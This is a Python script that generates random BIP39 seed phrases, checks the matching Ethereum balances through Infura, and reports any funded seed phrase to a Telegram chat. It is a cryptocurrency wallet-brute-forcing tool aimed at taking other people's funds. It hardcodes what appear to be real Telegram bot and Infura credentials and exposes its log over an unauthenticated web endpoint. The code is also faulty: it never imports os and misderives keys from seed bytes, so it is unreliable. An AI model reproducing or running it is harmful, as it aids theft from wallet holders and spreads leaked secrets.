import random
import requests
import telegram
from bip_utils import Bip39SeedGenerator, Bip39MnemonicGenerator, Bip39WordsNum
from web3 import Web3
from threading import Thread
from flask import Flask, render_template, jsonify
import logging

# Telegram bot setup
TELEGRAM_TOKEN = '7229289683:AAEc_XoEPvp2QJ1mpc29mdFd_6OTfOHphTA'
CHAT_ID = '-4231284691'
bot = telegram.Bot(token=TELEGRAM_TOKEN)

# Infura Project IDs
INFURA_PROJECT_IDS = [
    '67799fb447bd4f8bb4879cbd8b2a7cec',
    'f9b7f9fa880b4282882c379054ad6bb3'
]

# Global variables to store status
checked_wallets = 0
found_wallets = 0

# Set up logging
logging.basicConfig(filename='/var/log/seed_phrase_checker.log', level=logging.INFO)

def send_telegram_message(message):
    bot.send_message(chat_id=CHAT_ID, text=message)

def generate_seed_phrase():
    mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    return mnemonic, seed_bytes

def check_balance(seed_bytes):
    infura_project_id = random.choice(INFURA_PROJECT_IDS)
    web3 = Web3(Web3.HTTPProvider(f'https://mainnet.infura.io/v3/{infura_project_id}'))
    account = web3.eth.account.privateKeyToAccount(seed_bytes[:32])
    balance = web3.eth.get_balance(account.address)
    return balance, account.address

def main():
    global checked_wallets, found_wallets
    send_telegram_message('Seed Phrase Checker started.')
    logging.info('Seed Phrase Checker started.')
    while True:
        try:
            mnemonic, seed_bytes = generate_seed_phrase()
            balance, address = check_balance(seed_bytes)
            checked_wallets += 1
            if balance > 0:
                found_wallets += 1
                message = f'Seed phrase with balance found: {mnemonic} (Address: {address}, Balance: {balance})'
                send_telegram_message(message)
                logging.info(message)
            else:
                logging.info(f'Checked seed phrase: {mnemonic} - No balance found.')
        except requests.exceptions.RequestException as e:
            send_telegram_message(f'Network error: {e}')
            logging.error(f'Network error: {e}')
        except Exception as e:
            send_telegram_message(f'Error: {e}')
            logging.error(f'Error: {e}')

def run_flask_app():
    app = Flask(__name__)

    @app.route('/')
    def index():
        return render_template('index.html')

    @app.route('/status')
    def status():
        status_info = {
            'status': 'running',
            'checked_wallets': checked_wallets,
            'found_wallets': found_wallets
        }
        return jsonify(status_info)

    @app.route('/logs')
    def logs():
        log_file_path = '/var/log/seed_phrase_checker.log'
        if os.path.exists(log_file_path):
            with open(log_file_path, 'r') as log_file:
                logs = log_file.read()
        else:
            logs = "No logs found."
        return logs

    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    try:
        flask_thread = Thread(target=run_flask_app)
        flask_thread.start()
        main()
    except Exception as e:
        send_telegram_message(f'Script stopped due to an error: {e}')
        logging.error(f'Script stopped due to an error: {e}')
